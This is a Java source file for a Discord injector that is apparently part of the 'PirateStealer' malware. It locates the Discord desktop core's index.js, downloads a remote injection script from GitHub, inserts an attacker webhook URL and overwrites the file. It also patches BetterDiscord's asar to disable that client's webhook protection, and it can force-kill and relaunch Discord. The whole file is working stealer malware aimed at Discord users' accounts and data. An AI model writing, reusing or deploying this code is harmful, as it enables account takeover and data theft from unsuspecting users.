package io.github.itzgonza.impl;

import java.awt.Desktop;
import java.io.File;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import org.apache.commons.io.FileUtils;

public class DiscordInjector {

	public transient static DiscordInjector instance;
	
	private transient static String discordPath, betterPath, localPath, webhookURL;
	{
		discordPath = System.getenv("APPDATA") + "/Microsoft/Windows/Start Menu/Programs/Discord Inc";
		betterPath = System.getenv("APPDATA") + "/BetterDiscord/data";
		localPath = System.getenv("LOCALAPPDATA");
		webhookURL = new String("ur_webhook_url");
	};
	
	private transient static Boolean killCheck, bettCheck, legitMode;
	{
		killCheck = Boolean.FALSE;
		bettCheck = (new File(betterPath)).exists();
		legitMode = Boolean.TRUE;
	};

	@SuppressWarnings(value = {"unused"})
	public synchronized void initialize() throws Exception {
		if (!legitMode) utilities._instance.getDiscordKiller();
		if (bettCheck) utilities._instance.getRemoveBetterDcProtection();
		
		Inject: {
			for (File file : (new File(localPath)).listFiles(File::isDirectory)) {
				if ((String.valueOf(file)).contains("iscord")) {
					for (File file2 : (new File(String.valueOf(file))).listFiles(File::isDirectory)) {
						if ((new File(String.valueOf(file))).listFiles(File::isDirectory).length > 0) {
							for (File file3 : (new File(String.valueOf(file2))).listFiles(File::isDirectory)) {
								if ((String.valueOf(file3)).contains("app-")) {
									File[] directories = (new File(String.valueOf(file3))).listFiles(File::isDirectory);
									for (int i = 0; directories.length > i; i += 1) {
										for (File file4 : (directories[i]).listFiles(File::isDirectory)) {
											if ((String.valueOf(file4)).contains("discord_desktop_core")) {
												if (!legitMode) (new File(String.valueOf(file4) + "/gonza1337")).mkdirs();
												for (File file5 : (new File(String.valueOf(file4))).listFiles(File::isFile)) {
													if ((String.valueOf(file5)).contains("index.js")) {
													    Scanner scanner = new Scanner(new URL("https://raw.githubusercontent.com/itzgonza/PirateStealer/main/src/Injection/injection.js").openStream(), StandardCharsets.UTF_8.toString()).useDelimiter("\\A");
													    List<String> results = new ArrayList<String>();
													    results.add(scanner.next().replace("%WEBHOOK_LINK%", webhookURL));
													    FileUtils.writeLines(file5, StandardCharsets.UTF_8.toString(), results);
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		};
		
		if (!killCheck | legitMode)
			return;
		
		File[] files = (new File(discordPath)).listFiles(File::isFile);
		for (int i = 0; files.length > i; i += 1) {
			Desktop.getDesktop().open(files[i]);
		}
	}
	
	enum utilities {
		
		_instance;
		
		private synchronized void getDiscordKiller() throws Exception {
			Scanner scanner = new Scanner(Runtime.getRuntime().exec("tasklist.exe").getInputStream(), StandardCharsets.UTF_8.toString()).useDelimiter("\\A");
		    	String[] lines = new String(scanner.next()).split("\n");
			for (int i = 0; lines.length > i; i += 1) {
		    	String line = lines[i];
		    	if((line).contains("iscord")) {
		    		String total = line.substring(0, line.indexOf(" "));
				Runtime.getRuntime().exec("taskkill /F /IM " + total);
				killCheck = Boolean.TRUE;
		    	}
		    }
		}
		
		private synchronized void getRemoveBetterDcProtection() throws Exception {
			if ((new File(betterPath)).isDirectory()) {
				for (File file : (new File(betterPath)).listFiles(File::isFile)) {
					if ((String.valueOf(file)).endsWith("betterdiscord.asar")) {
						String data = FileUtils.readFileToString(new File(String.valueOf(file)), StandardCharsets.UTF_8.toString());
						data = data.replace("api/webhook", "gonzawashere");
						FileUtils.writeStringToFile(new File(String.valueOf(file)), data, StandardCharsets.UTF_8.toString());
					}
				}
			}
		}
		
	}
	
}